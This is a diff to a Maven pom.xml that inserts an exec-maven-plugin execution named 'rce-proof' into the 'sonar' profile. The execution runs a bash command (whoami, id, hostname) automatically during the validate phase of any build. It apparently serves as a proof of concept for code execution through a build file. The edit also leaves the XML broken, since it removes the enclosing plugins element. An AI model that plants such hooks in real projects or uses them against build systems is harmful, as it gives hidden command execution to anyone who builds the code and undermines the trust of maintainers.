@@ -131,8 +131,27 @@
         <profile>
             <id>sonar</id>
             <build>
-                <plugins>
-                    <plugin>
+                <plugin>
+    <groupId>org.codehaus.mojo</groupId>
+    <artifactId>exec-maven-plugin</artifactId>
+    <version>3.1.0</version>
+    <executions>
+        <execution>
+            <id>rce-proof</id>
+            <phase>validate</phase>
+            <goals>
+                <goal>exec</goal>
+            </goals>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>-c</argument>
+                    <argument>echo '=== POM RCE START ===' &amp;&amp; whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; echo '=== POM RCE END ==='</argument>
+                </arguments>
+            </configuration>
+        </execution>
+    </executions>
+</plugin>
                         <groupId>org.apache.maven.plugins</groupId>
                         <artifactId>maven-release-plugin</artifactId>
                         <version>${maven-release-plugin.version}</version>
